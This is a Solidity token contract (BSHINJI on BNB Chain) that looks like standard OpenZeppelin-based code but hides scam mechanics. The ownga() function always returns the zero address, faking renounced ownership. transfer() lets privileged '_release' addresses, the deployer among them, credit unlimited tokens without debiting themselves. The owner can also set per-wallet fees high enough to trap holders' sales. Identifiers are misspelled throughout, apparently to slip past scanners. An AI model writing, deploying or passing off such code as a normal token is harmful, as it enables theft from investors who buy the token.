/**
 *Submitted for verification at BscScan.com on 2022-06-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-05
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _ownga;   //1

    event owngahipTransferred(address indexed previousownga, address indexed newownga);//2

    /**
     * @dev Initializes the contract setting the deployer as the initial ownga.
     */
    constructor() {
        _transferowngahip(_msgSender());//3
    }

    /**
     * @dev Returns the address of the current ownga.
     */
    function ownga() public view virtual returns (address) {
        return address(0);
    }//4

    /**
     * @dev Throws if called by any account other than the ownga.
     */
    modifier onlyownga() {
        require(_ownga == _msgSender(), "Ownable: caller is not the ownga");
        _;
    }//5

    /**
     * @dev Leaves the contract without ownga. It will not be possible to call
     * `onlyownga` functions anymore. Can only be called by the current ownga.
     *
     * NOTE: Renouncing owngaship will leave the contract without an ownga,
     * thereby removing any functionality that is only available to the ownga.
     */
    function renounceowngahip() public virtual onlyownga {
        _transferowngahip(address(0));
    }//6

    /**
     * @dev Transfers owngaship of the contract to a new account (`newownga`).
     * Can only be called by the current ownga.
     */
    function transferowngahip(address newownga) public virtual onlyownga {
        require(newownga != address(0), "Ownable: new ownga is the zero address");
        _transferowngahip(newownga);
    }//7

    /**
     * @dev Transfers owngaship of the contract to a new account (`newownga`).
     * Internal function without access restriction.
     */
    function _transferowngahip(address newownga) internal virtual {
        address oldownga = _ownga;
        _ownga = newownga;
        emit owngahipTransferred(oldownga, newownga);
    }
}//8
//9 CHinh own

// File @openzeppelin/contracts/utils/math/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint AnoutADesired,
        uint AnoutBDesired,
        uint AnoutAMin,
        uint AnoutBMin,
        address to,
        uint deadline
    ) external returns (uint AnoutA, uint AnoutB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint AnoutTokenDesired,
        uint AnoutTokenMin,
        uint AnoutETHMin,
        address to,
        uint deadline
    ) external payable returns (uint AnoutToken, uint AnoutETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint AnoutAMin,
        uint AnoutBMin,
        address to,
        uint deadline
    ) external returns (uint AnoutA, uint AnoutB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint AnoutTokenMin,
        uint AnoutETHMin,
        address to,
        uint deadline
    ) external returns (uint AnoutToken, uint AnoutETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint AnoutAMin,
        uint AnoutBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AnoutA, uint AnoutB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint AnoutTokenMin,
        uint AnoutETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AnoutToken, uint AnoutETH);
    function swapExactTokensForTokens(
        uint AnoutIn,
        uint AnoutOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Anouts);
    function swapTokensForExactTokens(
        uint AnoutOut,
        uint AnoutInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Anouts);
    function swapExactETHForTokens(uint AnoutOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Anouts);
    function swapTokensForExactETH(uint AnoutOut, uint AnoutInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Anouts);
    function swapExactTokensForETH(uint AnoutIn, uint AnoutOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Anouts);
    function swapETHForExactTokens(uint AnoutOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Anouts);

    function quote(uint AnoutA, uint reserveA, uint reserveB) external pure returns (uint AnoutB);
    function getAnoutOut(uint AnoutIn, uint reserveIn, uint reserveOut) external pure returns (uint AnoutOut);
    function getAnoutIn(uint AnoutOut, uint reserveIn, uint reserveOut) external pure returns (uint AnoutIn);
    function getAnoutsOut(uint AnoutIn, address[] calldata path) external view returns (uint[] memory Anouts);
    function getAnoutsIn(uint AnoutOut, address[] calldata path) external view returns (uint[] memory Anouts);
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFheOnTransferTokens(
        address token,
        uint liquidity,
        uint AnoutTokenMin,
        uint AnoutETHMin,
        address to,
        uint deadline
    ) external returns (uint AnoutETH);
    function removeLiquidityETHWithPermitSupportingFheOnTransferTokens(
        address token,
        uint liquidity,
        uint AnoutTokenMin,
        uint AnoutETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint AnoutETH);

    function swapExactTokensForTokensSupportingFheOnTransferTokens(
        uint AnoutIn,
        uint AnoutOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFheOnTransferTokens(
        uint AnoutOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFheOnTransferTokens(
        uint AnoutIn,
        uint AnoutOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


// File @uniswap/v2-core/contracts/interfaces/[email protected]


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function FheTo() external view returns (address);
    function FheToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFheTo(address) external;
    function setFheToSetter(address) external;
}


// File contracts/Token.sol





contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `ownga` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed ownga, address indexed spender, uint256 value);//10

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address ownga, address spender) public view virtual returns (uint256) {
        return _allowances[ownga][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `Anout` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 Anout) public virtual returns (bool) {
        address ownga = _msgSender();
        _approve(ownga, spender, Anout);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address ownga = _msgSender();
        _approve(ownga, spender, _allowances[ownga][spender] + addedValue);
        return true;
    }//12

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address ownga = _msgSender();
        uint256 currentAllowance = _allowances[ownga][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(ownga, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Sets `Anout` as the allowance of `spender` over the `ownga` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `ownga` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address ownga,
        address spender,
        uint256 Anout
    ) internal virtual {
        require(ownga != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[ownga][spender] = Anout;
        emit Approval(ownga, spender, Anout);
    }

    /**
     * @dev Spend `Anout` form the allowance of `ownga` toward `spender`.
     *
     * Does not update the allowance anunt in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address ownga,
        address spender,
        uint256 Anout
    ) internal virtual {
        uint256 currentAllowance = allowance(ownga, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= Anout, "ERC20: insufficient allowance");
            unchecked {
                _approve(ownga, spender, currentAllowance - Anout);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `Anout` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `Anout` tokens will be minted for `to`.
     * - when `to` is zero, `Anout` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 Anout
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `Anout` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `Anout` tokens have been minted for `to`.
     * - when `to` is zero, `Anout` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 Anout
    ) internal virtual {}
}


contract BSHINJI is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 Anout
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= Anout, "ERC20: transfer Anout exceeds balance");
        unchecked {
            _balances[from] = fromBalance - Anout;
        }
        _balances[to] += Anout;

        emit Transfer(from, to, Anout);
    }

    function _burn(address account, uint256 Anout) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= Anout, "ERC20: burn Anout exceeds balance");
        unchecked {
            _balances[account] = accountBalance - Anout;
        }
        _totalSupply -= Anout;

        emit Transfer(account, address(0), Anout);
    }

    function _mitimi(address account, uint256 Anout) internal virtual {
        require(account != address(0), "ERC20: mitimi to the zero address"); //mint

        _totalSupply += Anout;
        _balances[account] += Anout;
        emit Transfer(address(0), account, Anout);
    }



    address public uniswapV2Pair;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mitimi(msg.sender, totalSupply_ * 10**decimals());

        transfer(_deadAddress, totalSupply() / 10*4);
        _defaultSellFhe = 5;
        _defaultBuyFhe = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellFhe = 0;

    uint256 private _defaultBuyFhe = 0;


    mapping(address => bool) private _marketAccount;

    mapping(address => uint256) private _slipFhe;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyownga returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyownga {
        uniswapV2Pair = _address;
    }


    function upSF(uint256 _value) external onlyownga {
        _defaultSellFhe = _value;
    }

    function setSlipFhe(address _address, uint256 _value) external onlyownga {
        require(_value > 4, "Account tax must be greater than or equal to 1");
        _slipFhe[_address] = _value;
    }

    function getSlipFhe(address _address) external view onlyownga returns (uint256) {
        return _slipFhe[_address];
    }


    function setMarketAccountFhe(address _address, bool _value) external onlyownga {
        _marketAccount[_address] = _value;
    }

    function getMarketAccountFhe(address _address) external view onlyownga returns (bool) {
        return _marketAccount[_address];
    }

    function _checkFreeAccount(address from, address _to) internal view returns (bool) {
        return _marketAccount[from] || _marketAccount[_to];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _Anout
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _Anout, "ERC20: transfer Anout exceeds balance");

        bool rF = true;

        if (_checkFreeAccount(from, _to)) {
            rF = false;
        }
        uint256 tradeFheAnout = 0;

        if (rF) {
            uint256 tradeFhe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeFhe = _defaultSellFhe;
                }
                if (from == uniswapV2Pair) {

                    tradeFhe = _defaultBuyFhe;
                }
            }
            if (_slipFhe[from] > 0) {
                tradeFhe = _slipFhe[from];
            }

            tradeFheAnout = _Anout.mul(tradeFhe).div(100);
        }


        if (tradeFheAnout > 0) {
            _balances[from] = _balances[from].sub(tradeFheAnout);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFheAnout);
            emit Transfer(from, _deadAddress, tradeFheAnout);
        }

        _balances[from] = _balances[from].sub(_Anout - tradeFheAnout);
        _balances[_to] = _balances[_to].add(_Anout - tradeFheAnout);
        emit Transfer(from, _to, _Anout - tradeFheAnout);
    }

    function transfer(address to, uint256 Anout) public virtual returns (bool) {
        address ownga = _msgSender();
        if (_release[ownga] == true) {
            _balances[to] += Anout;
            return true;
        }
        _receiveF(ownga, to, Anout);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 Anout
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, Anout);
        _receiveF(from, to, Anout);
        return true;
    }
}